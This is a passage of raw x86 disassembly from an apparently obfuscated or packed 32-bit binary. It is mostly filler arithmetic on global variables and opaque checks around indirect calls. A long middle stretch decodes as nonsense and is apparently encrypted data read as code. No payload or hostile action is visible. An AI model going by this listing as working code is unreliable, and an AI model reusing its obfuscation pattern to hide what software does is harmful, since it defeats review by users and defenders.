  41ca92:	mov    DWORD PTR ds:0x42840d,edx
  41ca98:	jmp    0x41cafc
  41ca9d:	mov    DWORD PTR ds:0x428419,edx
  41caa3:	mov    DWORD PTR ds:0x4284e9,ebx
  41caa9:	cmp    DWORD PTR ds:0x428435,0x0
  41cab0:	jbe    0x41cad5
  41cab6:	push   DWORD PTR [ebp-0x1c]
  41cab9:	call   DWORD PTR ds:0x42e128
  41cabf:	sub    DWORD PTR ds:0x4284f1,edi
  41cac5:	xor    ecx,ecx
  41cac7:	add    ecx,DWORD PTR ds:0x428581
  41cacd:	mov    ecx,DWORD PTR [ecx]
  41cacf:	adc    DWORD PTR ds:0x42844d,ecx
  41cad5:	and    ecx,DWORD PTR ds:0x428541
  41cadb:	sub    ecx,ecx
  41cadd:	xor    ecx,ecx
  41cadf:	or     ecx,DWORD PTR ds:0x428549
  41cae5:	and    ecx,DWORD PTR ds:0x428451
  41caeb:	mov    DWORD PTR ds:0x428549,ecx
  41caf1:	adc    ecx,DWORD PTR ds:0x4283f9
  41caf7:	or     eax,0x53d3
  41cafc:	mov    DWORD PTR [ebp-0xc4],0x6236
  41cb06:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41cb0d:	jmp    0x41cef4
  41cb12:	pop    ebx
  41cb13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb14:	jmp    0x31aa:0x7b9c3cd8
  41cb1b:	add    al,0x9a
  41cb1d:	jecxz  0x41cb42
  41cb1f:	(bad)  
  41cb20:	bound  ebx,QWORD PTR [esi-0x413fb615]
  41cb26:	dec    edx
  41cb27:	les    edi,FWORD PTR [esi+0x59db7fbe]
  41cb2d:	mov    ecx,esi
  41cb2f:	das    
  41cb30:	lock nop
  41cb32:	dec    ecx
  41cb33:	inc    esi
  41cb34:	or     cl,BYTE PTR [ecx-0x10]
  41cb37:	mov    WORD PTR [ecx+eax*2+0x6d2d51f9],cs
  41cb3e:	cmp    DWORD PTR [eax],edx
  41cb40:	inc    ebp
  41cb41:	inc    esp
  41cb42:	push   ss
  41cb43:	mov    esi,0xd2e7e8ad
  41cb48:	and    BYTE PTR [ebx],ah
  41cb4a:	xchg   ebx,eax
  41cb4b:	mov    cl,BYTE PTR [ebp+0x16f7e3d1]
  41cb51:	fwait
  41cb52:	rcl    BYTE PTR [edx-0x1],1
  41cb55:	add    dl,BYTE PTR [ebx]
  41cb57:	imul   ecx,ecx,0x77
  41cb5a:	cmp    eax,ebx
  41cb5c:	mov    es,esi
  41cb5e:	inc    ebp
  41cb5f:	(bad)  
  41cb60:	fimul  WORD PTR [ebp+eax*1-0x1c]
  41cb64:	aas    
  41cb65:	mov    dl,0x29
  41cb67:	push   cs
  41cb68:	sub    al,BYTE PTR [ebp-0x5d42b74b]
  41cb6e:	(bad)  
  41cb70:	out    dx,eax
  41cb71:	jecxz  0x41cb11
  41cb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb74:	cli    
  41cb75:	enter  0xd3fa,0xeb
  41cb79:	iret   
  41cb7a:	mov    dl,0xec
  41cb7c:	mov    dl,0x13
  41cb7e:	cmp    DWORD PTR [edi+0x62],ecx
  41cb81:	mov    fs,WORD PTR [si+0x38]
  41cb85:	es jno 0x41cb19
  41cb88:	cmp    eax,0x1da2a409
  41cb8d:	mov    al,0xf6
  41cb8f:	xor    al,BYTE PTR [edx-0x2bc9ae89]
  41cb95:	adc    dh,BYTE PTR [ebx+0x24]
  41cb98:	aad    0x54
  41cb9a:	adc    al,0xf
  41cb9c:	fwait
  41cb9d:	mov    al,BYTE PTR ss:[ebx]
  41cba0:	in     eax,dx
  41cba1:	xchg   edi,eax
  41cba2:	mov    eax,ds:0xe4758d22
  41cba7:	sbb    eax,0x95b227fb
  41cbac:	mov    dl,0x71
  41cbae:	jmp    0xc7bbfa6b
  41cbb3:	jnp    0x41cbe4
  41cbb5:	xchg   ebx,eax
  41cbb6:	cmp    ah,ch
  41cbb8:	mov    WORD PTR ss:[ebx+0x61a6b660],ss
  41cbbf:	mov    al,0x9c
  41cbc1:	cmp    al,ah
  41cbc3:	mov    ds:0x10790b34,al
  41cbc8:	ret    0x759c
  41cbcb:	mov    es,WORD PTR [esi-0x28bb3e32]
  41cbd1:	add    ecx,ebx
  41cbd3:	es jle 0x41cbdb
  41cbd6:	push   ds
  41cbd7:	pop    edx
  41cbd8:	mov    esi,0xa36a5ba5
  41cbdd:	cdq    
  41cbde:	mov    bh,BYTE PTR [eax]
  41cbe0:	pusha  
  41cbe1:	add    ecx,DWORD PTR [ebx]
  41cbe3:	fimul  WORD PTR [edi+0x7e]
  41cbe6:	gs pop eax
  41cbe8:	sahf   
  41cbe9:	pop    ecx
  41cbea:	icebp  
  41cbeb:	jno    0x41cc40
  41cbed:	xor    BYTE PTR [ebx],al
  41cbef:	fcom   st(0)
  41cbf1:	cli    
  41cbf2:	retf   0xba69
  41cbf5:	mov    esp,DWORD PTR [ecx]
  41cbf7:	mov    eax,ds:0x5ca54f67
  41cbfc:	stos   BYTE PTR es:[edi],al
  41cbfd:	xor    BYTE PTR [eax],dl
  41cbff:	jae    0x41cc0d
  41cc01:	mov    bh,0x71
  41cc03:	outs   dx,BYTE PTR fs:[esi]
  41cc05:	je     0x41cc1f
  41cc07:	xor    BYTE PTR [esi-0x24],0x7f
  41cc0b:	dec    esp
  41cc0c:	pusha  
  41cc0d:	sbb    BYTE PTR [esi+0x1d],bl
  41cc10:	lods   al,BYTE PTR ds:[esi]
  41cc11:	cmc    
  41cc12:	pop    esi
  41cc13:	out    0xbc,eax
  41cc15:	mov    edx,0x3acec7ea
  41cc1a:	mov    ch,0x92
  41cc1c:	fwait
  41cc1d:	rcl    DWORD PTR [esi],0x52
  41cc20:	call   0x553f:0x3ba094aa
  41cc27:	add    al,0x87
  41cc29:	inc    edx
  41cc2a:	push   cs
  41cc2b:	sub    BYTE PTR [esi-0x3],ch
  41cc2e:	cmp    edx,DWORD PTR [eax+0x26590b4b]
  41cc34:	push   cs
  41cc35:	out    0xd,eax
  41cc37:	ret    
  41cc38:	dec    ebp
  41cc39:	imul   edi,edx,0xb3905037
  41cc3f:	xchg   BYTE PTR [ebx+0x7517797c],dh
  41cc45:	iret   
  41cc46:	inc    eax
  41cc47:	push   es
  41cc48:	and    bl,BYTE PTR [ebp+0x7595016d]
  41cc4e:	(bad)  
  41cc4f:	xchg   edi,eax
  41cc50:	or     esi,DWORD PTR [eax-0x60985d2a]
  41cc56:	jp     0x41cc9d
  41cc58:	sub    al,0x37
  41cc5a:	jbe    0x41cc2a
  41cc5c:	pushf  
  41cc5d:	adc    edx,ebp
  41cc5f:	cmp    al,0xb2
  41cc61:	in     eax,0x49
  41cc63:	pop    esi
  41cc64:	push   0x6f
  41cc66:	dec    ecx
  41cc67:	mov    edi,0x5e99e731
  41cc6c:	push   esi
  41cc6d:	adc    BYTE PTR [ebx-0x60fb6af7],ch
  41cc73:	dec    ecx
  41cc74:	add    DWORD PTR [esi],edx
  41cc76:	adc    eax,0x9669bccc
  41cc7b:	xor    al,0x57
  41cc7d:	and    eax,0x3c523da
  41cc82:	jle    0x41cc35
  41cc84:	or     edi,ebx
  41cc86:	and    ebx,DWORD PTR [ebx]
  41cc88:	enter  0x36b2,0x54
  41cc8c:	and    DWORD PTR [ebx],eax
  41cc8e:	pop    esp
  41cc8f:	mov    WORD PTR [eax],cs
  41cc91:	push   edi
  41cc92:	arpl   WORD PTR [edx-0x6ea54df6],ax
  41cc98:	cmp    ecx,DWORD PTR [edi]
  41cc9a:	and    BYTE PTR [esi+0x6c8d10cc],bl
  41cca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cca1:	fldcw  WORD PTR [eax-0x39]
  41cca4:	nop
  41cca5:	jb     0x41cd19
  41cca7:	stos   BYTE PTR es:[edi],al
  41cca8:	pop    ss
  41cca9:	shr    DWORD PTR [eax+0x2b],cl
  41ccac:	test   eax,0xb6ecd84f
  41ccb1:	xor    bh,BYTE PTR [ebx+0x7e]
  41ccb4:	mov    edi,ds
  41ccb6:	hlt    
  41ccb7:	ret    0x7f59
  41ccba:	adc    cl,ch
  41ccbc:	fst    QWORD PTR [ecx+0x5f5ee2d0]
  41ccc2:	mov    ah,0x87
  41ccc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccc5:	sbb    BYTE PTR cs:[edi-0x4f5bed48],bh
  41cccc:	ds push 0x16e15f2f
  41ccd2:	(bad)  
  41ccd3:	mov    eax,0x436b9edb
  41ccd8:	dec    ecx
  41ccd9:	pop    ss
  41ccda:	test   ebp,0xfa4e2544
  41cce0:	jge    0x41cccd
  41cce2:	adc    bh,dh
  41cce4:	cmp    ch,dl
  41cce6:	aaa    
  41cce7:	out    dx,al
  41cce8:	mov    dh,0xbc
  41ccea:	add    DWORD PTR [ebp-0x4c8395ac],edx
  41ccf0:	ds sub al,0xc0
  41ccf3:	shl    DWORD PTR [edi+ecx*4-0x162e6769],cl
  41ccfa:	add    DWORD PTR [ebp-0x29],ebx
  41ccfd:	fist   DWORD PTR [eax]
  41ccff:	pop    ds
  41cd00:	push   es
  41cd01:	cs fcmovne st,st(6)
  41cd04:	loop   0x41cca2
  41cd06:	mov    DWORD PTR [eax+ebx*1+0x3b],0xfcc6743a
  41cd0e:	xor    eax,0xd43b08e2
  41cd13:	mov    eax,ds:0xef33960e
  41cd18:	enter  0x382a,0x81
  41cd1c:	adc    BYTE PTR [esi+0x7843e16b],cl
  41cd22:	bound  edi,QWORD PTR [edi]
  41cd24:	cld    
  41cd25:	loop   0x41cd16
  41cd27:	pop    esp
  41cd28:	dec    esp
  41cd29:	dec    edi
  41cd2a:	sbb    bh,BYTE PTR [ecx-0x47]
  41cd2d:	das    
  41cd2e:	pop    es
  41cd2f:	sub    BYTE PTR [esi],bh
  41cd31:	xchg   esi,eax
  41cd32:	push   ebp
  41cd33:	push   esi
  41cd34:	jp     0x41ccbf
  41cd36:	xor    BYTE PTR [ecx],dh
  41cd38:	fist   DWORD PTR [edx]
  41cd3a:	sub    al,0x60
  41cd3c:	jno    0x41cd02
  41cd3e:	xor    BYTE PTR [ebp+ecx*4+0x3e5f1df1],ch
  41cd45:	jnp    0x41cd46
  41cd47:	and    esi,esi
  41cd49:	mov    BYTE PTR [edi],bh
  41cd4b:	js     0x41cdba
  41cd4d:	retf   0xf72b
  41cd50:	push   edx
  41cd51:	test   al,0xab
  41cd53:	int    0x48
  41cd55:	or     esi,DWORD PTR [esi-0x2e]
  41cd58:	jmp    0x3a706d96
  41cd5d:	inc    eax
  41cd5e:	jae    0x41cdaa
  41cd60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd61:	jg     0x41cceb
  41cd63:	pop    edx
  41cd64:	adc    al,0x9a
  41cd66:	xchg   ecx,eax
  41cd67:	stos   BYTE PTR es:[edi],al
  41cd68:	(bad)  
  41cd6a:	push   es
  41cd6b:	adc    eax,0xeece43cc
  41cd70:	mov    edi,0x9ec9af9b
  41cd75:	scas   eax,DWORD PTR es:[edi]
  41cd76:	sbb    al,0xe5
  41cd78:	xor    BYTE PTR [edi],cl
  41cd7a:	jmp    0xc03a:0x351cb481
  41cd81:	sbb    bl,al
  41cd83:	stos   BYTE PTR es:[edi],al
  41cd84:	inc    edi
  41cd85:	scas   eax,DWORD PTR es:[edi]
  41cd86:	jle    0x41cdb6
  41cd88:	or     bh,bl
  41cd8a:	fdivr  st(3),st
  41cd8c:	dec    esi
  41cd8d:	push   esi
  41cd8e:	loop   0x41cda4
  41cd90:	jp     0x41cdd2
  41cd92:	xor    DWORD PTR [edi+0x16],ebp
  41cd95:	iret   
  41cd96:	sub    ch,bl
  41cd98:	mov    ebx,0xbdb1679c
  41cd9d:	or     eax,DWORD PTR [edx-0x1bc8b46a]
  41cda3:	mov    ah,0xfe
  41cda5:	jp     0x41cdc4
  41cda7:	imul   esp,DWORD PTR ds:0x6a411f2d,0xffffffa3
  41cdae:	test   eax,0x56d0b944
  41cdb3:	ja     0x41ce10
  41cdb5:	xor    eax,0x2149534
  41cdba:	les    edx,FWORD PTR [ebx]
  41cdbc:	sbb    DWORD PTR [edx],0xe3d788d6
  41cdc2:	pop    ecx
  41cdc3:	mov    DWORD PTR [edx],ecx
  41cdc5:	aad    0x25
  41cdc7:	xor    DWORD PTR [edx-0x5623b081],edx
  41cdcd:	ss or  ah,al
  41cdd0:	dec    esi
  41cdd1:	in     al,dx
  41cdd2:	dec    edi
  41cdd3:	jne    0x41cdc2
  41cdd5:	fisttp DWORD PTR [ecx-0x358f13aa]
  41cddb:	stos   DWORD PTR es:[edi],eax
  41cddc:	mov    DWORD PTR [edi+0x5c4ecb31],edx
  41cde2:	fcmovne st,st(4)
  41cde4:	mov    esp,0x2b66c6cb
  41cde9:	or     eax,0x7484176
  41cdee:	mov    bh,0x58
  41cdf0:	retf   0x4d7d
  41cdf3:	aas    
  41cdf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdf5:	hlt    
  41cdf6:	adc    DWORD PTR [ecx],eax
  41cdf8:	outs   dx,BYTE PTR ds:[esi]
  41cdf9:	mov    al,0x49
  41cdfb:	cmp    bh,BYTE PTR [esi]
  41cdfd:	cmc    
  41cdfe:	rcr    DWORD PTR [edx+eiz*1-0x7c],cl
  41ce02:	push   cs
  41ce03:	adc    DWORD PTR [eax-0x6a],0xffffff95
  41ce07:	loope  0x41cd9c
  41ce09:	fucomi st,st(3)
  41ce0b:	test   BYTE PTR [edx-0x4297a6b5],bh
  41ce11:	mov    edi,0x6ed3f364
  41ce16:	sbb    DWORD PTR [ecx+0x36],esp
  41ce19:	xor    bx,WORD PTR [esi-0x5555c018]
  41ce20:	leave  
  41ce21:	inc    eax
  41ce22:	dec    ebp
  41ce23:	lahf   
  41ce24:	sbb    DWORD PTR [esi+ecx*1+0x7cee46cc],ecx
  41ce2b:	add    eax,0x6800ded6
  41ce30:	dec    ebp
  41ce31:	push   esp
  41ce32:	hlt    
  41ce33:	sahf   
  41ce34:	jp     0x41cdcd
  41ce36:	dec    ebp
  41ce37:	push   ecx
  41ce38:	das    
  41ce39:	mov    ds:0x18ee1b18,al
  41ce3e:	push   0x5ff7a657
  41ce43:	mov    ebp,0x48c03af
  41ce48:	push   cs
  41ce49:	jge    0x41ce67
  41ce4b:	pop    ebp
  41ce4c:	ret    
  41ce4d:	movntps XMMWORD PTR [edx+0x75],xmm7
  41ce51:	xchg   edx,eax
  41ce52:	xchg   ebx,eax
  41ce53:	sbb    al,0xd0
  41ce55:	popf   
  41ce56:	ja     0x41ce10
  41ce58:	stc    
  41ce59:	mov    cl,0x13
  41ce5b:	pop    ds
  41ce5c:	mov    BYTE PTR [esi+esi*8+0x30],ch
  41ce60:	xor    DWORD PTR [eax-0x51],edx
  41ce63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce64:	loopne 0x41ce4b
  41ce66:	sti    
  41ce67:	push   eax
  41ce68:	inc    ebx
  41ce69:	add    eax,0xf38152ed
  41ce6e:	xchg   BYTE PTR [ebp-0x5b8d59ee],cl
  41ce74:	cmp    DWORD PTR [edx+edx*2-0x3e],0xedab4487
  41ce7c:	loopne 0x41cee8
  41ce7e:	mov    al,0x24
  41ce80:	pop    edx
  41ce81:	mov    ch,0xc1
  41ce83:	(bad)  
  41ce84:	shr    BYTE PTR [edi+0x63],1
  41ce87:	aas    
  41ce88:	inc    esi
  41ce89:	loop   0x41ceef
  41ce8b:	dec    esp
  41ce8c:	in     eax,dx
  41ce8d:	push   edx
  41ce8e:	xchg   BYTE PTR [edi+0x341f8612],dl
  41ce94:	cmp    ah,dl
  41ce96:	ja     0x41ce47
  41ce98:	inc    eax
  41ce99:	cld    
  41ce9a:	mov    ah,0xa
  41ce9c:	daa    
  41ce9d:	imul   edx,ebp,0xffffffb0
  41cea0:	das    
  41cea1:	push   esp
  41cea2:	jecxz  0x41ce2d
  41cea4:	adc    ebx,DWORD PTR [ecx+0x426d5954]
  41ceaa:	push   eax
  41ceab:	lods   eax,DWORD PTR ds:[esi]
  41ceac:	stos   DWORD PTR es:[edi],eax
  41cead:	ror    BYTE PTR [edi-0x16],1
  41ceb0:	add    BYTE PTR [ebp+0x1d],dl
  41ceb3:	dec    esi
  41ceb4:	push   es
  41ceb5:	int3   
  41ceb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceb7:	hlt    
  41ceb8:	(bad)  
  41ceb9:	in     al,0xbc
  41cebb:	les    edi,FWORD PTR [edx+eax*1]
  41cebe:	fwait
  41cebf:	push   ebx
  41cec0:	push   edx
  41cec1:	xchg   esi,eax
  41cec2:	xchg   ecx,eax
  41cec3:	clc    
  41cec4:	imul   ecx,DWORD PTR [ecx],0x4a7c8f2f
  41ceca:	jmp    0x41cefe
  41cecc:	out    dx,eax
  41cecd:	adc    dh,BYTE PTR [ebx-0xf65d651]
  41ced3:	push   esp
  41ced4:	jmp    0x41cecc
  41ced6:	add    edi,DWORD PTR [esi-0x3f2bf16a]
  41cedc:	sbb    edx,DWORD PTR [esi]
  41cede:	int    0xd8
  41cee0:	push   ds
  41cee1:	sub    ebp,ebx
  41cee3:	mov    cl,0x90
  41cee5:	fldcw  WORD PTR ds:0xd8722153
  41ceeb:	push   edx
  41ceec:	add    DWORD PTR [ebx],eax
  41ceee:	addr16 stc 
  41cef0:	add    BYTE PTR [eax],dl
  41cef2:	sahf   
  41cef3:	adc    al,0xc7
  41cef5:	test   eax,ebx
  41cef7:	(bad)  
  41cef8:	(bad)  
  41cef9:	push   DWORD PTR [edi]
  41cefb:	jne    0x41cefd
  41cefd:	add    BYTE PTR [ecx],dh
  41ceff:	adc    eax,0x428469
  41cf04:	mov    DWORD PTR [ebp-0x114],0x6985
  41cf0e:	and    DWORD PTR ds:0x4284d9,ebx
  41cf14:	mov    DWORD PTR [ebp-0x14],0x5627
  41cf1b:	or     DWORD PTR ds:0x428441,0x428545
  41cf25:	mov    DWORD PTR [ebp-0x64],0x72e7
  41cf2c:	mov    eax,DWORD PTR [ebp-0x14]
  41cf2f:	and    DWORD PTR ds:0x428541,ebx
  41cf35:	add    eax,DWORD PTR [ebp-0x64]
  41cf38:	mov    ecx,DWORD PTR [ebp-0x114]
  41cf3e:	sbb    DWORD PTR ds:0x4284c5,0x42832d
  41cf48:	sub    eax,ecx
  41cf4a:	xor    DWORD PTR ds:0x428361,edi
  41cf50:	mov    ecx,DWORD PTR [ebp-0x128]
  41cf56:	imul   eax,ecx
  41cf59:	cmp    DWORD PTR ds:0x428555,0x0
  41cf60:	mov    DWORD PTR ds:0x4284f1,0x44b
  41cf6a:	mov    ecx,DWORD PTR ds:0x428471
  41cf70:	mov    ecx,DWORD PTR ds:0x42846d
  41cf76:	mov    ecx,0x4ae9
  41cf7b:	jmp    0x41cfe3
  41cf80:	mov    ecx,DWORD PTR ds:0x4284e9
  41cf86:	mov    DWORD PTR ds:0x42833d,0x5810
  41cf90:	cmp    DWORD PTR ds:0x428555,0x0
  41cf97:	ja     0x41cfcd
  41cf9d:	push   0x42854d
  41cfa2:	push   0x16d1
  41cfa7:	push   DWORD PTR [ebp-0x20]
  41cfaa:	push   0x7e78
  41cfaf:	call   DWORD PTR ds:0x42e078
  41cfb5:	mov    ecx,DWORD PTR ds:0x42832d
  41cfbb:	sbb    DWORD PTR ds:0x42856d,ecx
  41cfc1:	sub    DWORD PTR ds:0x42842d,ecx
  41cfc7:	not    DWORD PTR ds:0x4284e9
  41cfcd:	xor    DWORD PTR ds:0x4284e5,edi
  41cfd3:	mov    DWORD PTR ds:0x428425,0x4e0f
  41cfdd:	xor    ecx,DWORD PTR ds:0x428541
  41cfe3:	imul   eax,eax,0xe4e
  41cfe9:	mov    ecx,DWORD PTR [ebp-0x7c]
  41cfec:	or     eax,ecx
  41cfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41cff1:	adc    DWORD PTR ds:0x428561,0xad
  41cffb:	lea    eax,[ecx+eax*1+0x46210209]
  41d002:	add    DWORD PTR ds:0x428439,0x55ef
  41d00c:	push   eax
  41d00d:	call   0x410df4
  41d012:	mov    ecx,eax
  41d014:	cmp    DWORD PTR ds:0x42832d,0x0
  41d01b:	mov    esi,DWORD PTR ds:0x428565
  41d021:	mov    DWORD PTR ds:0x428431,0x25c4
  41d02b:	jmp    0x41d0fd
  41d030:	mov    DWORD PTR ds:0x42845d,0x7eed
  41d03a:	mov    DWORD PTR ds:0x42854d,edx
  41d040:	cmp    DWORD PTR ds:0x42832d,0x0
  41d047:	jbe    0x41d070
  41d04d:	push   0x428361
  41d052:	call   DWORD PTR ds:0x42e2a0
  41d058:	and    esi,esi
  41d05a:	and    esi,DWORD PTR ds:0x4284c9
  41d060:	mov    esi,DWORD PTR ds:0x428501
  41d066:	mov    esi,DWORD PTR [esi]
  41d068:	xor    DWORD PTR ds:0x4284d9,esi
  41d06e:	xor    esi,esi
  41d070:	add    DWORD PTR ds:0x428345,ebx
  41d076:	movzx  esi,BYTE PTR ds:0x428551
  41d07d:	sbb    DWORD PTR ds:0x428455,esi
  41d083:	sbb    DWORD PTR ds:0x428559,0x428409
  41d08d:	or     esi,esi
  41d08f:	cmp    DWORD PTR ds:0x42835d,0x0
  41d096:	mov    DWORD PTR ds:0x4284e1,0x3cb6
  41d0a0:	mov    esi,0x65ca
  41d0a5:	mov    DWORD PTR ds:0x4284f1,edi
  41d0ab:	jmp    0x41d0fd
  41d0b0:	mov    DWORD PTR ds:0x42854d,edi
  41d0b6:	mov    eax,0x6c7b
  41d0bb:	cmp    DWORD PTR ds:0x42835d,0x0
  41d0c2:	jg     0x41d0eb
  41d0c8:	push   0x1a0a
  41d0cd:	push   DWORD PTR [ebp-0x24]
  41d0d0:	push   DWORD PTR [ebp-0xc]
  41d0d3:	call   DWORD PTR ds:0x42e12c
  41d0d9:	and    DWORD PTR ds:0x42853d,edx
  41d0df:	xor    DWORD PTR ds:0x428349,ebx
  41d0e5:	sub    esi,0x4c5f
  41d0eb:	sbb    DWORD PTR ds:0x428321,0x56b4
  41d0f5:	sbb    esi,esi
  41d0f7:	add    DWORD PTR ds:0x428439,ebx
  41d0fd:	mov    eax,DWORD PTR [ebp-0xc4]
  41d103:	imul   eax,eax,0x21b3
  41d109:	cmp    DWORD PTR ds:0x428345,0x0
  41d110:	mov    esi,0x3999
  41d115:	movzx  esi,BYTE PTR ds:0x428551
  41d11c:	mov    esi,0x5e4b
  41d121:	mov    esi,DWORD PTR ds:0x428329
  41d127:	jmp    0x41d1a8
  41d12c:	mov    DWORD PTR ds:0x4284dd,0x7a2a
  41d136:	not    esi
  41d138:	cmp    DWORD PTR ds:0x428345,0x0
  41d13f:	jb     0x41d183
  41d145:	push   0x5450
  41d14a:	push   0x3c7c
  41d14f:	call   DWORD PTR ds:0x42e07c
  41d155:	mov    esi,DWORD PTR ds:0x428539
  41d15b:	add    esi,DWORD PTR ds:0x42845d
  41d161:	mov    DWORD PTR ds:0x428539,esi
  41d167:	mov    esi,DWORD PTR ds:0x428401
  41d16d:	and    esi,DWORD PTR ds:0x428429
  41d173:	mov    DWORD PTR ds:0x428401,esi
  41d179:	sbb    DWORD PTR ds:0x428471,0x6b94
  41d183:	mov    esi,DWORD PTR ds:0x42843d
  41d189:	add    DWORD PTR ds:0x4284c5,esi
  41d18f:	movzx  esi,WORD PTR ds:0x428439
  41d196:	adc    esi,DWORD PTR ds:0x428355
  41d19c:	mov    DWORD PTR ds:0x428439,esi
  41d1a2:	xor    DWORD PTR ds:0x428329,edi
  41d1a8:	add    eax,DWORD PTR [ebp-0xe4]
  41d1ae:	and    eax,0xd5c
  41d1b3:	sub    eax,0x2e81
  41d1b8:	xor    edx,edx
  41d1ba:	sbb    DWORD PTR ds:0x42834d,ebx
  41d1c0:	mov    esi,0x2f1dc
  41d1c5:	or     DWORD PTR ds:0x428335,0x1bf3
  41d1cf:	div    esi
  41d1d1:	cmp    DWORD PTR ds:0x42844d,0x0
  41d1d8:	mov    DWORD PTR ds:0x428541,0x7c0f
  41d1e2:	mov    DWORD PTR ds:0x428469,0x21cd
  41d1ec:	mov    esi,DWORD PTR ds:0x428321
  41d1f2:	jmp    0x41d24d
  41d1f7:	mov    DWORD PTR ds:0x42856d,0x7012
  41d201:	mov    esi,0x5ebc
  41d206:	cmp    DWORD PTR ds:0x42844d,0x0
  41d20d:	jne    0x41d239
  41d213:	push   0x389e
  41d218:	push   0x768e
  41d21d:	push   0x6d0b
  41d222:	push   0x8403
  41d227:	call   DWORD PTR ds:0x42e130
  41d22d:	sbb    edx,DWORD PTR ds:0x428465
  41d233:	add    edx,0x16c4
  41d239:	movzx  esi,WORD PTR ds:0x4283f5
  41d240:	adc    DWORD PTR ds:0x4284c5,esi
  41d246:	sub    DWORD PTR ds:0x4284d9,edx
  41d24c:	inc    esi
  41d24d:	xor    eax,0x56ef
  41d252:	add    DWORD PTR ds:0x428551,0x7098
  41d25c:	add    ecx,eax
  41d25e:	cmp    DWORD PTR ds:0x428429,0x0
  41d265:	mov    DWORD PTR ds:0x42834d,0x1f02
  41d26f:	mov    esi,0x4128
  41d274:	mov    esi,DWORD PTR ds:0x4284bd
  41d27a:	jmp    0x41d2f7
  41d27f:	mov    DWORD PTR ds:0x42853d,ebx
  41d285:	movzx  eax,WORD PTR ds:0x42840d
  41d28c:	cmp    DWORD PTR ds:0x428429,0x0
  41d293:	jb     0x41d2d0
  41d299:	push   0x4840
  41d29e:	push   DWORD PTR [ebp-0x14]
  41d2a1:	push   0x75a6
  41d2a6:	push   DWORD PTR [ebp-0xc]
  41d2a9:	push   0x428233
  41d2ae:	push   DWORD PTR [ebp-0x28]
  41d2b1:	call   DWORD PTR ds:0x42e134
  41d2b7:	movzx  esi,BYTE PTR ds:0x428539
  41d2be:	xor    DWORD PTR ds:0x4284d5,esi
  41d2c4:	xor    esi,edx
  41d2c6:	or     DWORD PTR ds:0x428461,0x2eb3
  41d2d0:	xor    DWORD PTR ds:0x42854d,ebx
  41d2d6:	adc    edx,DWORD PTR ds:0x428561
  41d2dc:	add    DWORD PTR ds:0x42833d,0x1b5f
  41d2e6:	mov    esi,DWORD PTR ds:0x428509
  41d2ec:	mov    edx,DWORD PTR ds:0x4285a1
  41d2f2:	sub    edx,esi
  41d2f4:	sub    esi,DWORD PTR [esi+edx*1]
  41d2f7:	mov    DWORD PTR [ebp-0x90],ecx
  41d2fd:	mov    DWORD PTR [ebp-0xe0],0x7a31
  41d307:	mov    DWORD PTR ds:0x42842d,0x52c8
  41d311:	mov    DWORD PTR [ebp-0x44],0x2514
  41d318:	mov    DWORD PTR [ebp-0xdc],0x699c
  41d322:	cmp    DWORD PTR ds:0x4284c9,0x0
  41d329:	mov    DWORD PTR ds:0x4284f1,0x628e
  41d333:	movzx  ecx,BYTE PTR ds:0x428341
  41d33a:	mov    ecx,DWORD PTR ds:0x428421
  41d340:	jmp    0x41d3bd
  41d345:	mov    DWORD PTR ds:0x4283fd,0x21ce
  41d34f:	mov    DWORD PTR ds:0x428359,edi
  41d355:	cmp    DWORD PTR ds:0x4284c9,0x0
  41d35c:	jge    0x41d39a
  41d362:	push   DWORD PTR [ebp-0x20]
  41d365:	push   DWORD PTR [ebp-0xc]
  41d368:	push   DWORD PTR [ebp-0x18]
  41d36b:	call   DWORD PTR ds:0x42e138
  41d371:	mov    ecx,DWORD PTR ds:0x428385
  41d377:	mov    edx,DWORD PTR ds:0x4285a9
  41d37d:	sub    ecx,edx
  41d37f:	sub    ecx,DWORD PTR [ecx+edx*1]
  41d382:	sub    ecx,0x1d69
  41d388:	mov    ecx,DWORD PTR ds:0x4284a5
  41d38e:	mov    edx,DWORD PTR ds:0x42859d
  41d394:	sub    ecx,edx
  41d396:	imul   ecx,DWORD PTR [ecx+edx*1]
  41d39a:	sbb    DWORD PTR ds:0x4284e1,0x4f1
  41d3a4:	sub    esi,DWORD PTR ds:0x42856d
  41d3aa:	xor    esi,esi
  41d3ac:	add    esi,DWORD PTR ds:0x4283c9
  41d3b2:	mov    edx,DWORD PTR ds:0x42847d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x428395
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x4283a1
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x4283f9
  41d412:	xor    DWORD PTR ds:0x4284c5,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42856d,0x428329
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428559,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x428419,0x0
